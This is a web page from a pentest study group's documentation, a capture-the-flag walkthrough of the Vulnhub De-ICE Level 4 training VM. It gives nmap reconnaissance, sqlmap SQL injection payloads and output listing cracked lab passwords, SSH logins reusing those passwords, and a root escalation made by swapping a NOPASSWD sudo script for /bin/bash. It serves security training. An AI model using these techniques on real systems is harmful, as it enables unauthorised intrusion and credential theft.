

<!DOCTYPE html>
<!--[if IE 8]><html class="no-js lt-ie9" lang="en" > <![endif]-->
<!--[if gt IE 8]><!--> <html class="no-js" lang="en" > <!--<![endif]-->
<head>
  <meta charset="utf-8">
  <meta content="default-src 'none'; script-src 'self' https://cdnjs.cloudflare.com 'unsafe-inline'; connect-src 'self'; img-src 'self'; style-src 'self'; font-src 'self'; form-action 'self'; frame-ancestors 'none'; base-uri 'self'" http-equiv="Content-Security-Policy" />
<meta content="nosniff" http-equiv="X-Content-Type-Options" />
<meta content="deny" http-equiv="X-Frame-Options" />
<meta content="1; mode=block" http-equiv="X-XSS-Protection" />
<meta content="strict-origin" http-equiv="Referrer-Policy" />
<meta content="max-age=31536000; includeSubDomains" http-equiv="Strict-Transport-Security" />
<meta content="'*'" http-equiv="Access-Control-Allow-Origin" />

  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  <title>3.5. De-ICE Level 4 &mdash; South Bay WASP 1.0.3 documentation</title>
  

  
  
  
  

  

  
  
    

  

  
  
    <link rel="stylesheet" href="../_static/css/theme.css" type="text/css" />
  

  

  
        <link rel="index" title="Index"
              href="../genindex.html"/>
        <link rel="search" title="Search" href="../search.html"/>
    <link rel="top" title="South Bay WASP 1.0.3 documentation" href="../index.html"/>
        <link rel="up" title="3. Pentest Challenges" href="../pentest_challenges.html"/>
        <link rel="next" title="3.6. De-ICE Level 3" href="de-ice3.html"/>
        <link rel="prev" title="3.4. De-ICE Level 5" href="de-ice5.html"/> 

  
  <script src="../_static/js/modernizr.min.js"></script>

</head>

<body class="wy-body-for-nav" role="document">

   
  <div class="wy-grid-for-nav">

    
    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
      <div class="wy-side-scroll">
        <div class="wy-side-nav-search">
          

          
            <a href="../index.html" class="icon icon-home"> South Bay WASP
          

          
          </a>

          
            
            
              <div class="version">
                1.0
              </div>
            
          

          
<div role="search">
  <form id="rtd-search-form" class="wy-form" action="../search.html" method="get">
    <input type="text" name="q" placeholder="Search docs" />
    <input type="hidden" name="check_keywords" value="yes" />
    <input type="hidden" name="area" value="default" />
  </form>
</div>

          
        </div>

        <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
          
            
            
              
            
            
              <p class="caption"><span class="caption-text">Table of Contents</span></p>
<ul class="current">
<li class="toctree-l1"><a class="reference internal" href="../pentest_intro.html">1. South Bay WASP Meetup</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_kali.html">2. Kali Linux</a></li>
<li class="toctree-l1 current"><a class="reference internal" href="../pentest_challenges.html">3. Pentest Challenges</a><ul class="current">
<li class="toctree-l2"><a class="reference internal" href="VWADP.html">3.1. Finding and running challenges</a></li>
<li class="toctree-l2"><a class="reference internal" href="owlnest.html">3.2. OwlNest</a></li>
<li class="toctree-l2"><a class="reference internal" href="de-ice6.html">3.3. De-ICE Level 6</a></li>
<li class="toctree-l2"><a class="reference internal" href="de-ice5.html">3.4. De-ICE Level 5</a></li>
<li class="toctree-l2 current"><a class="current reference internal" href="#">3.5. De-ICE Level 4</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#setup">3.5.1. Setup</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#setting-up-the-vm">3.5.1.1. Setting up the VM</a></li>
<li class="toctree-l4"><a class="reference internal" href="#setting-up-your-environment">3.5.1.2. Setting up your environment</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#reconnaisance">3.5.2. Reconnaisance</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#network-reconnaissance">3.5.2.1. Network reconnaissance</a></li>
<li class="toctree-l4"><a class="reference internal" href="#browsing-port-80">3.5.2.2. Browsing port 80</a></li>
<li class="toctree-l4"><a class="reference internal" href="#sqlmap-of-products-php-form">3.5.2.3. <strong class="program">sqlmap</strong> of <code class="file docutils literal notranslate"><span class="pre">products.php</span></code> form</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#the-exploit">3.5.3. The Exploit</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#mysql-passwords-ssh-passwords">3.5.3.1. MySQL passwords = SSH passwords</a></li>
<li class="toctree-l4"><a class="reference internal" href="#from-user-ccoffee-to-root">3.5.3.2. From user ccoffee to root</a></li>
<li class="toctree-l4"><a class="reference internal" href="#getting-internal-documents">3.5.3.3. Getting internal documents</a></li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="de-ice3.html">3.6. De-ICE Level 3</a></li>
<li class="toctree-l2"><a class="reference internal" href="de-ice2.html">3.7. De-ICE Level 2</a></li>
<li class="toctree-l2"><a class="reference internal" href="de-ice1.html">3.8. De-ICE Level 1</a></li>
<li class="toctree-l2"><a class="reference internal" href="underdist3.html">3.9. Underdist: 3</a></li>
<li class="toctree-l2"><a class="reference internal" href="kioptrix5.html">3.10. Kioptrix Level 5</a></li>
<li class="toctree-l2"><a class="reference internal" href="kioptrix4.html">3.11. Kioptrix Level 4</a></li>
<li class="toctree-l2"><a class="reference internal" href="kioptrix3.html">3.12. Kioptrix Level 3</a></li>
<li class="toctree-l2"><a class="reference internal" href="kioptrix2.html">3.13. Kioptrix Level 2</a></li>
<li class="toctree-l2"><a class="reference internal" href="kioptrix1.html">3.14. Kioptrix Level 1</a></li>
<li class="toctree-l2"><a class="reference internal" href="security_shepherd.html">3.15. Security Shepherd Web App Levels</a></li>
<li class="toctree-l2"><a class="reference internal" href="holynix2.html">3.16. Holynix2</a></li>
<li class="toctree-l2"><a class="reference internal" href="holynix1.html">3.17. Holynix1</a></li>
<li class="toctree-l2"><a class="reference internal" href="freshly.html">3.18. Freshly</a></li>
<li class="toctree-l2"><a class="reference internal" href="zorz.html">3.19. ZorZ</a></li>
<li class="toctree-l2"><a class="reference internal" href="vulnix.html">3.20. Vulnix</a></li>
<li class="toctree-l2"><a class="reference internal" href="googles_xss_game.html">3.21. Google’s XSS Game</a></li>
<li class="toctree-l2"><a class="reference internal" href="owning_database_with_sqlmap.html">3.22. Owning the Database with SQLMap</a></li>
<li class="toctree-l2"><a class="reference internal" href="from_sql_injection_to_shell_II.html">3.23. PentesterLab From SQL injection to Shell II</a></li>
<li class="toctree-l2"><a class="reference internal" href="from_sql_injection_to_shell.html">3.24. PentesterLab From SQL injection to Shell</a></li>
<li class="toctree-l2"><a class="reference internal" href="skytower1.html">3.25. SkyTower1</a></li>
<li class="toctree-l2"><a class="reference internal" href="nebula.html">3.26. Exploit Exercises Nebula</a></li>
<li class="toctree-l2"><a class="reference internal" href="natas.html">3.27. Natas</a></li>
<li class="toctree-l2"><a class="reference internal" href="try2hack.nl.html">3.28. try2hack.nl</a></li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_encryption.html">4. Encryption</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_html.html">5. HTML</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_network_tools.html">6. Pentest Network Tools</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_recon.html">7. Pentest Reconnaisance</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_study.html">8. Pentest Study</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_buffer_overflow.html">9. Pentest Buffer Overflow</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_scripting.html">10. Pentest scripting</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_presentations.html">11. Pentest Presentations</a></li>
</ul>

            
          
        </div>
      </div>
    </nav>

    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">

      
      <nav class="wy-nav-top" role="navigation" aria-label="top navigation">
        
          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
          <a href="../index.html">South Bay WASP</a>
        
      </nav>


      
      <div class="wy-nav-content">
        <div class="rst-content">
          















<div role="navigation" aria-label="breadcrumbs navigation">

  <ul class="wy-breadcrumbs">
    
      <li><a href="../index.html">Docs</a> &raquo;</li>
        
          <li><a href="../pentest_challenges.html">3. Pentest Challenges</a> &raquo;</li>
        
      <li>3.5. De-ICE Level 4</li>
    
    
      <li class="wy-breadcrumbs-aside">
        
            
            <a href="../_sources/challenges/de-ice4.rst.txt" rel="nofollow"> View page source</a>
          
        
      </li>
    
  </ul>

  
  <hr/>
</div>
          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
           <div itemprop="articleBody">
            
  <div class="section" id="de-ice-level-4">
<span id="de-ice4"></span><h1>3.5. De-ICE Level 4<a class="headerlink" href="#de-ice-level-4" title="Permalink to this headline">¶</a></h1>
<div class="section" id="setup">
<h2>3.5.1. Setup<a class="headerlink" href="#setup" title="Permalink to this headline">¶</a></h2>
<p>This is to document the meetup’s efforts responding to the challenge <a class="reference external" href="https://www.vulnhub.com/entry/de-ice-s1120,10/">Vulnhub De-ICE: S1.120</a>, the fourth of the Vulnhub De-ICE series. This is a challenge to get “various internal documents”.</p>
<div class="section" id="setting-up-the-vm">
<h3>3.5.1.1. Setting up the VM<a class="headerlink" href="#setting-up-the-vm" title="Permalink to this headline">¶</a></h3>
<p>The VM comes packaged as the live ISO <a class="reference external" href="http://hackingdojo.com/downloads/iso/De-ICE_S1.120.iso">De-ICE_S1.120.iso</a> running SLAX 6.1.2 (based on Slackware 12.2.0). It uses fixed IP 192.168.1.120.</p>
</div>
<div class="section" id="setting-up-your-environment">
<h3>3.5.1.2. Setting up your environment<a class="headerlink" href="#setting-up-your-environment" title="Permalink to this headline">¶</a></h3>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/de-ice4
mkdir -p <span class="nv">$PT</span>
<span class="nb">cd</span> <span class="nv">$PT</span>
<span class="c1"># download de-ice4_setup.sh</span>
curl --silent --remote-name https://pentest-meetup.appspot.com/html/_downloads/de-ice4_setup.sh
<span class="c1"># edit as needed; later the recon will give you TARGET IPs</span>
<span class="nb">source</span> de-ice4_setup.sh
</pre></div>
</div>
<p>The source for <code class="file docutils literal notranslate"><span class="pre">de-ice4_setup.sh</span></code> (<a class="reference download internal" href="../_downloads/de-ice4_setup.sh" download=""><code class="xref download docutils literal notranslate"><span class="pre">de-ice4_setup.sh</span></code></a>) should look something like the following.</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env bash</span>

<span class="c1"># *******************************************************</span>
<span class="c1"># Edit these to match your setup</span>
<span class="c1"># *******************************************************</span>
<span class="nv">TARGET</span><span class="o">=</span><span class="m">192</span>.168.1.120          <span class="c1"># ip of de-ice4</span>
<span class="nv">SUBNET</span><span class="o">=</span><span class="m">192</span>.168.1.0/24         <span class="c1"># subnet</span>
<span class="nv">KALI</span><span class="o">=</span><span class="m">192</span>.168.1.100            <span class="c1"># Kali IP</span>
<span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/de-ice4      <span class="c1"># create working directories here</span>

<span class="k">if</span> <span class="o">[[</span> <span class="k">$(</span>grep -c de-ice4 /etc/hosts<span class="k">)</span> -eq <span class="m">0</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
  <span class="nb">echo</span> <span class="s2">&quot; add \&quot;</span><span class="nv">$TARGET</span><span class="s2"> de-ice4.com\&quot; to /etc/hosts&quot;</span>
<span class="k">fi</span>

<span class="c1"># *******************************************************</span>
<span class="c1"># Maybe edit these</span>
<span class="c1"># *******************************************************</span>
<span class="c1"># Create some directories</span>
<span class="nv">TOOLS</span><span class="o">=</span>exploit,nmap,sqlmap
<span class="nb">eval</span> mkdir -p <span class="nv">$PT</span>/<span class="o">{</span><span class="nv">$TOOLS</span><span class="o">}</span>
<span class="nv">TARGETS</span><span class="o">=</span>targets.txt

<span class="c1"># *******************************************************</span>
<span class="c1"># Don&#39;t edit these</span>
<span class="c1"># *******************************************************</span>
<span class="nv">HOST</span><span class="o">=</span>de-ice4.com
<span class="nv">SUDO</span><span class="o">=</span><span class="k">$(</span>which sudo<span class="k">)</span>
<span class="o">[[</span> <span class="s2">&quot;</span><span class="nv">$USER</span><span class="s2">&quot;</span> <span class="o">==</span> <span class="s2">&quot;root&quot;</span> <span class="o">]]</span> <span class="o">&amp;&amp;</span> <span class="nv">SUDO</span><span class="o">=</span>
</pre></div>
</div>
</div>
</div>
<div class="section" id="reconnaisance">
<h2>3.5.2. Reconnaisance<a class="headerlink" href="#reconnaisance" title="Permalink to this headline">¶</a></h2>
<div class="section" id="network-reconnaissance">
<h3>3.5.2.1. Network reconnaissance<a class="headerlink" href="#network-reconnaissance" title="Permalink to this headline">¶</a></h3>
<p>Start with some standard network reconnaissance looking for the vulnerable host:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/de-ice4
<span class="nb">source</span> <span class="nv">$PT</span>/de-ice4_setup.sh
<span class="nb">cd</span> <span class="nv">$PT</span>/nmap

<span class="nv">$SUDO</span> nmap -sn -PE -oA nmap_sn <span class="nv">$SUBNET</span>
<span class="nv">$SUDO</span> chown <span class="nv">$USER</span>.<span class="nv">$USER</span> nmap_sn.*
<span class="c1"># use the grep-able output to get a list of target hosts</span>
grep Up nmap_sn.gnmap <span class="p">|</span> cut -d<span class="s2">&quot; &quot;</span> -f2 &gt; <span class="nv">$TARGETS</span>
<span class="c1"># use the xml output to get an html report</span>
xsltproc nmap_sn.xml -o nmap_sn.html
</pre></div>
</div>
<p>Here we find the IP for de-ice4: $TARGET. Update $PT/de-ice4_setup.sh and also edit <code class="file docutils literal notranslate"><span class="pre">/etc/hosts</span></code> to add “de-ice4.com” (<code class="docutils literal notranslate"><span class="pre">echo</span> <span class="pre">&quot;$TARGET</span> <span class="pre">de-ice4.com&quot;</span> <span class="pre">|</span> <span class="pre">$SUDO</span> <span class="pre">tee</span> <span class="pre">-a</span> <span class="pre">/etc/hosts</span></code>).</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/de-ice4
<span class="nb">source</span> <span class="nv">$PT</span>/de-ice4_setup.sh
<span class="nb">cd</span> <span class="nv">$PT</span>/nmap

<span class="nv">$SUDO</span> nmap -A -vv -T3 --max-retries <span class="m">5</span> -Pn -oA nmap_A <span class="nv">$TARGET</span>
<span class="nv">$SUDO</span> chown <span class="nv">$USER</span>.<span class="nv">$USER</span> nmap_A.*
xsltproc nmap_A.xml -o nmap_A.html
</pre></div>
</div>
<p>Running this reveals:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="hll"><span class="go">PORT     STATE SERVICE  REASON         VERSION</span>
</span><span class="hll"><span class="go">21/tcp   open  ftp      syn-ack ttl 64 ProFTPD 1.3.2</span>
</span><span class="hll"><span class="go">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span>
</span><span class="go">|_dr-xr-xr-x   2 0        0              40 Jan  2  2011 incoming</span>
<span class="hll"><span class="go">22/tcp   open  ssh      syn-ack ttl 64 OpenSSH 5.1 (protocol 2.0)</span>
</span><span class="hll"><span class="go">80/tcp   open  http     syn-ack ttl 64 Apache httpd 2.2.11 ((Unix) DAV/2 mod_ssl/2.2.11 OpenSSL/0.9.8k PHP/5.2.9 mod_apreq2-20051231/2.6.0 mod_perl/2.0.4 Perl/v5.10.0)</span>
</span><span class="go">|_http-title: Primaline :: Quality Kitchen Accessories</span>
<span class="hll"><span class="go">443/tcp  open  ssl/http syn-ack ttl 64 Apache httpd 2.2.11 ((Unix) DAV/2 mod_ssl/2.2.11 OpenSSL/0.9.8k PHP/5.2.9 mod_apreq2-20051231/2.6.0 mod_perl/2.0.4 Perl/v5.10.0)</span>
</span><span class="go">|_http-title: Primaline :: Quality Kitchen Accessories</span>
<span class="hll"><span class="go">3306/tcp open  mysql    syn-ack ttl 64 MySQL (unauthorized)</span>
</span><span class="go">MAC Address: 52:54:00:32:4F:FD (QEMU Virtual NIC)</span>
<span class="go">Device type: general purpose</span>
<span class="go">Running: Linux 2.6.X</span>
<span class="go">OS CPE: cpe:/o:linux:linux_kernel:2.6</span>
<span class="go">OS details: Linux 2.6.13 - 2.6.32</span>
</pre></div>
</div>
</div>
<div class="section" id="browsing-port-80">
<h3>3.5.2.2. Browsing port 80<a class="headerlink" href="#browsing-port-80" title="Permalink to this headline">¶</a></h3>
<p>Visiting <a class="reference external" href="http://de-ice4.com/">http://de-ice4.com/</a> leads to <a class="reference external" href="http://de-ice4.com/products.php">http://de-ice4.com/products.php</a> and this form:</p>
<div class="highlight-html notranslate"><div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">&quot;products.php&quot;</span> <span class="na">method</span><span class="o">=</span><span class="s">&quot;GET&quot;</span><span class="p">&gt;</span>
  Product: <span class="p">&lt;</span><span class="nt">select</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;id&quot;</span><span class="p">&gt;&lt;</span><span class="nt">option</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;NULL&quot;</span><span class="p">&gt;</span>Select Product<span class="p">&lt;/</span><span class="nt">option</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;&lt;/</span><span class="nt">select</span><span class="p">&gt;&lt;</span><span class="nt">p</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;Submit&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;Submit&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
</pre></div>
</div>
</div>
<div class="section" id="sqlmap-of-products-php-form">
<h3>3.5.2.3. <strong class="program">sqlmap</strong> of <code class="file docutils literal notranslate"><span class="pre">products.php</span></code> form<a class="headerlink" href="#sqlmap-of-products-php-form" title="Permalink to this headline">¶</a></h3>
<p>Attacking the form on <a class="reference external" href="http://de-ice4.com/products.php">http://de-ice4.com/products.php</a> with <strong class="program">sqlmap</strong>:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/de-ice4
<span class="nb">source</span> <span class="nv">$PT</span>/de-ice4_setup.sh
<span class="nb">cd</span> <span class="nv">$PT</span>/sqlmap

<span class="hll">rm -rf sqlmap
</span><span class="hll"><span class="nv">URL</span><span class="o">=</span><span class="s2">&quot;http://</span><span class="nv">$TARGET</span><span class="s2">/products.php&quot;</span>
</span><span class="hll">sqlmap -u <span class="s2">&quot;</span><span class="nv">$URL</span><span class="s2">&quot;</span> --batch --random-agent --output-dir <span class="nv">$PWD</span>/sqlmap <span class="se">\</span>
</span><span class="hll">  --banner --current-user --is-dba --current-db --users --passwords <span class="se">\</span>
</span><span class="hll">  --forms --dbs
</span></pre></div>
</div>
<p>Running this gives:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/pentest/de-ice4/sqlmap$</span> sqlmap -u <span class="s2">&quot;</span><span class="nv">$URL</span><span class="s2">&quot;</span> --batch --random-agent --output-dir <span class="nv">$PWD</span>/sqlmap <span class="se">\</span>
&gt;   --banner --current-user --is-dba --current-db --users --passwords <span class="se">\</span>
&gt;   --forms --dbs

<span class="go">sqlmap identified the following injection point(s) with a total of 93 HTTP(s) requests:</span>
<span class="go">---</span>
<span class="go">Parameter: id (GET)</span>
<span class="go">    Type: AND/OR time-based blind</span>
<span class="go">    Title: MySQL &gt;= 5.0.12 AND time-based blind (SELECT)</span>
<span class="go">    Payload: id=NULL AND (SELECT * FROM (SELECT(SLEEP(5)))OfVy)</span>

<span class="go">    Type: UNION query</span>
<span class="go">    Title: Generic UNION query (NULL) - 5 columns</span>
<span class="go">    Payload: id=NULL UNION ALL SELECT NULL,NULL,CONCAT(0x7162786b71,0x705256575568487a6d6d,0x716b706a71),NULL,NULL--</span>
<span class="go">---</span>
<span class="go">web application technology: Apache 2.2.11, PHP 5.2.9</span>
<span class="go">back-end DBMS: MySQL 5.0.12</span>
<span class="hll"><span class="go">banner:    &#39;5.1.33&#39;</span>
</span><span class="hll"><span class="go">current user:    &#39;webapp@localhost&#39;</span>
</span><span class="hll"><span class="go">current database:    &#39;merch&#39;</span>
</span><span class="hll"><span class="go">current user is DBA:    True</span>
</span><span class="hll"><span class="go">[19:24:26] [INFO] cracked password &#39;0&#39; for user &#39;aadams&#39;</span>
</span><span class="hll"><span class="go">[19:24:29] [INFO] cracked password &#39;111111&#39; for user &#39;aharp&#39;</span>
</span><span class="hll"><span class="go">[19:24:29] [INFO] cracked password &#39;123123&#39; for user &#39;kclemons&#39;</span>
</span><span class="hll"><span class="go">[19:24:29] [INFO] cracked password &#39;1234&#39; for user &#39;rjacobson&#39;</span>
</span><span class="hll"><span class="go">[19:24:29] [INFO] cracked password &#39;12345&#39; for user &#39;dgrant&#39;</span>
</span><span class="hll"><span class="go">[19:24:29] [INFO] cracked password &#39;123456&#39; for user &#39;dtraylor&#39;</span>
</span><span class="hll"><span class="go">[19:24:29] [INFO] cracked password &#39;1234567&#39; for user &#39;dgilfillan&#39;</span>
</span><span class="hll"><span class="go">[19:24:29] [INFO] cracked password &#39;12345678&#39; for user &#39;sgains&#39;</span>
</span><span class="hll"><span class="go">[19:24:36] [INFO] cracked password &#39;654321&#39; for user &#39;strammel&#39;</span>
</span><span class="hll"><span class="go">[19:24:36] [INFO] cracked password &#39;666666&#39; for user &#39;aspears&#39;</span>
</span><span class="hll"><span class="go">[19:24:43] [INFO] cracked password &#39;Password&#39; for user &#39;lmorales&#39;</span>
</span><span class="hll"><span class="go">[19:24:46] [INFO] cracked password &#39;abc123&#39; for user &#39;mrodriguez&#39;</span>
</span><span class="hll"><span class="go">[19:24:49] [INFO] cracked password &#39;babyl0n&#39; for user &#39;jdavenport&#39;</span>
</span><span class="hll"><span class="go">[19:24:50] [INFO] cracked password &#39;baseball&#39; for user &#39;bwatkins&#39;</span>
</span><span class="hll"><span class="go">[19:24:50] [INFO] cracked password &#39;batman&#39; for user &#39;hlovell&#39;</span>
</span><span class="hll"><span class="go">[19:24:51] [INFO] cracked password &#39;blahblah&#39; for user &#39;qpowers&#39;</span>
</span><span class="hll"><span class="go">[19:24:54] [INFO] cracked password &#39;cheese&#39; for user &#39;mholland&#39;</span>
</span><span class="hll"><span class="go">[19:24:55] [INFO] cracked password &#39;computer&#39; for user &#39;djohnson&#39;</span>
</span><span class="hll"><span class="go">[19:24:55] [INFO] cracked password &#39;consumer&#39; for user &#39;mbryan&#39;</span>
</span><span class="hll"><span class="go">[19:24:58] [INFO] cracked password &#39;dragon&#39; for user &#39;bphillips&#39;</span>
</span><span class="hll"><span class="go">[19:25:01] [INFO] cracked password &#39;football&#39; for user &#39;rdominguez&#39;</span>
</span><span class="hll"><span class="go">[19:25:02] [INFO] cracked password &#39;gawker&#39; for user &#39;dstevens&#39;</span>
</span><span class="hll"><span class="go">[19:25:03] [INFO] cracked password &#39;gizmodo&#39; for user &#39;jalvarez&#39;</span>
</span><span class="hll"><span class="go">[19:25:06] [INFO] cracked password &#39;iloveyou&#39; for user &#39;jalcantar&#39;</span>
</span><span class="hll"><span class="go">[19:25:08] [INFO] cracked password &#39;jennifer&#39; for user &#39;jbresnahan&#39;</span>
</span><span class="hll"><span class="go">[19:25:08] [INFO] cracked password &#39;jordan&#39; for user &#39;krenfro&#39;</span>
</span><span class="hll"><span class="go">[19:25:10] [INFO] cracked password &#39;killer&#39; for user &#39;jayala&#39;</span>
</span><span class="hll"><span class="go">[19:25:11] [INFO] cracked password &#39;kotaku&#39; for user &#39;rpatel&#39;</span>
</span><span class="hll"><span class="go">[19:25:12] [INFO] cracked password &#39;letmein&#39; for user &#39;mnader&#39;</span>
</span><span class="hll"><span class="go">[19:25:12] [INFO] cracked password &#39;lifehack&#39; for user &#39;swarren&#39;</span>
</span><span class="hll"><span class="go">[19:25:15] [INFO] cracked password &#39;master&#39; for user &#39;dcooper&#39;</span>
</span><span class="hll"><span class="go">[19:25:15] [INFO] cracked password &#39;michael&#39; for user &#39;aard&#39;</span>
</span><span class="hll"><span class="go">[19:25:15] [INFO] cracked password &#39;michelle&#39; for user &#39;tdeleon&#39;</span>
</span><span class="hll"><span class="go">[19:25:17] [INFO] cracked password &#39;monkey&#39; for user &#39;sjohnson&#39;</span>
</span><span class="hll"><span class="go">[19:25:18] [INFO] cracked password &#39;nintendo&#39; for user &#39;bbanter&#39;</span>
</span><span class="hll"><span class="go">[19:25:20] [INFO] cracked password &#39;passw0rd&#39; for user &#39;jduff&#39;</span>
</span><span class="hll"><span class="go">[19:25:20] [INFO] cracked password &#39;password&#39; for user &#39;ccoffee&#39;</span>
</span><span class="hll"><span class="go">[19:25:21] [INFO] cracked password &#39;pepper&#39; for user &#39;jfranklin&#39;</span>
</span><span class="hll"><span class="go">[19:25:22] [INFO] cracked password &#39;pokemon&#39; for user &#39;myajima&#39;</span>
</span><span class="hll"><span class="go">[19:25:23] [INFO] cracked password &#39;princess&#39; for user &#39;aheflin&#39;</span>
</span><span class="hll"><span class="go">[19:25:23] [INFO] cracked password &#39;qwerty&#39; for user &#39;lmartinez&#39;</span>
</span><span class="hll"><span class="go">[19:25:27] [INFO] cracked password &#39;shadow&#39; for user &#39;amaynard&#39;</span>
</span><span class="hll"><span class="go">[19:25:28] [INFO] cracked password &#39;soccer&#39; for user &#39;cchisholm&#39;</span>
</span><span class="hll"><span class="go">[19:25:29] [INFO] cracked password &#39;starwars&#39; for user &#39;ktso&#39;</span>
</span><span class="hll"><span class="go">[19:25:29] [INFO] cracked password &#39;sunshine&#39; for user &#39;kwebber&#39;</span>
</span><span class="hll"><span class="go">[19:25:30] [INFO] cracked password &#39;superman&#39; for user &#39;aweiland&#39;</span>
</span><span class="hll"><span class="go">[19:25:32] [INFO] cracked password &#39;trustno1&#39; for user &#39;dwestling&#39;</span>
</span><span class="hll"><span class="go">[19:25:34] [INFO] cracked password &#39;welcome&#39; for user &#39;aallen&#39;</span>
</span><span class="hll"><span class="go">[19:25:35] [INFO] cracked password &#39;whatever&#39; for user &#39;tgoodchap&#39;</span>
</span><span class="go">[19:25:37] [INFO] fetching database names</span>
<span class="hll"><span class="go">available databases [6]:</span>
</span><span class="hll"><span class="go">[*] cdcol</span>
</span><span class="hll"><span class="go">[*] information_schema</span>
</span><span class="hll"><span class="go">[*] merch</span>
</span><span class="hll"><span class="go">[*] mysql</span>
</span><span class="hll"><span class="go">[*] phpmyadmin</span>
</span><span class="hll"><span class="go">[*] test</span>
</span></pre></div>
</div>
</div>
</div>
<div class="section" id="the-exploit">
<h2>3.5.3. The Exploit<a class="headerlink" href="#the-exploit" title="Permalink to this headline">¶</a></h2>
<div class="section" id="mysql-passwords-ssh-passwords">
<h3>3.5.3.1. MySQL passwords = SSH passwords<a class="headerlink" href="#mysql-passwords-ssh-passwords" title="Permalink to this headline">¶</a></h3>
<p>It turns out the MySQL passwords cracked above were also SSH passwords. Try the first one for some simple reconnaisance to see if there might be a better id to use: user ccoffee is a member of the group “admin”.</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="hll">sshpass -p <span class="s1">&#39;0&#39;</span> ssh aadams@de-ice4.com
</span><span class="hll">grep admin /etc/group
</span><span class="c1"># results in</span>
<span class="hll"><span class="c1"># admin:x:102:ccoffee</span>
</span><span class="nb">exit</span>
</pre></div>
</div>
</div>
<div class="section" id="from-user-ccoffee-to-root">
<h3>3.5.3.2. From user ccoffee to root<a class="headerlink" href="#from-user-ccoffee-to-root" title="Permalink to this headline">¶</a></h3>
<p>Logging in as ccoffee/password shows ccoffee can <code class="docutils literal notranslate"><span class="pre">sudo</span> <span class="pre">/home/ccoffee/scripts/getlogs.sh</span></code>. But ccoffee can replace <code class="file docutils literal notranslate"><span class="pre">getlogs.sh</span></code> with any shell script (such as <code class="docutils literal notranslate"><span class="pre">/bin/bash</span></code> to get root):</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="hll">sshpass -p <span class="s1">&#39;password&#39;</span> ssh ccoffee@de-ice4.com
</span><span class="hll">sudo -l
</span><span class="c1"># results in</span>
<span class="c1"># User ccoffee may run the following commands on this host:</span>
<span class="hll"><span class="c1">#    (root) NOPASSWD: /home/ccoffee/scripts/getlogs.sh</span>
</span><span class="nb">cd</span> /home/ccoffee/scripts
ls -l getlogs.sh
<span class="c1"># results in</span>
<span class="c1"># -rws--x--x 1 root    admin 110 Aug 15 01:20 getlogs.sh*</span>
<span class="hll">mv getlogs.sh x.sh
</span><span class="hll"><span class="nb">echo</span> <span class="s2">&quot;/bin/bash&quot;</span> &gt; getlogs.sh
</span><span class="hll">chmod +x getlogs.sh
</span><span class="hll">sudo /home/ccoffee/scripts/getlogs.sh
</span><span class="hll">id
</span><span class="c1"># results in</span>
<span class="hll"><span class="c1"># uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),17(audio),18(video),19(cdrom),26(tape),83(plugdev)</span>
</span></pre></div>
</div>
</div>
<div class="section" id="getting-internal-documents">
<h3>3.5.3.3. Getting internal documents<a class="headerlink" href="#getting-internal-documents" title="Permalink to this headline">¶</a></h3>
<p>So we’re root. All we have to do is find the “various internal documents”. The reader can start with <code class="file docutils literal notranslate"><span class="pre">/home/ktso/personnel.doc</span></code> and we leave it as an exercise to find the rest.</p>
</div>
</div>
</div>


           </div>
           <div class="articleComments">
            
           </div>
          </div>
          <footer>
  
    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
      
